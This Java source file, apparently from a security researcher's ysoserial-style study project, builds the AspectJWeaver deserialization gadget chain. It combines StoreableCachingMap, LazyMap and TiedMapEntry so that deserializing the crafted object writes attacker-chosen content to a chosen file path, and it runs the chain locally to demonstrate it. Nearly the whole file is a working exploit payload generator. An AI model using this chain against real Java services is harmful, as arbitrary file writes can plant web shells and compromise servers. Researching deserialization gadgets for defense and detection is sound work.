package org.su18.serialize.ysoserial.AspectJWeaver;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Constructor;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
 *
 * @author su18
 */
public class AspectJWeaver {

	public static void main(String[] args) throws Exception {

		String fileName    = "123.txt";
		String filePath    = "/Users/phoebe/Downloads";
		String fileContent = "su18 is here";

		// 初始化 HashMap
		HashMap<Object, Object> hashMap = new HashMap<>();

		// 实例化  StoreableCachingMap 类
		Class<?>       c           = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
		Constructor<?> constructor = c.getDeclaredConstructor(String.class, int.class);
		constructor.setAccessible(true);
		Map map = (Map) constructor.newInstance(filePath, 10000);

		// 初始化一个 Transformer，使其 transform 方法返回要写出的 byte[] 类型的文件内容
		Transformer transformer = new ConstantTransformer(fileContent.getBytes(StandardCharsets.UTF_8));

		// 使用 StoreableCachingMap 创建 LazyMap 并引入 TiedMapEntry
		Map          lazyMap = LazyMap.decorate(map, transformer);
		TiedMapEntry entry   = new TiedMapEntry(lazyMap, fileName);

		// entry 放到 HashSet 中
		HashSet set = SerializeUtil.generateHashSet(entry);

		SerializeUtil.writeObjectToFile(set);
		SerializeUtil.readFileObject();
	}

}
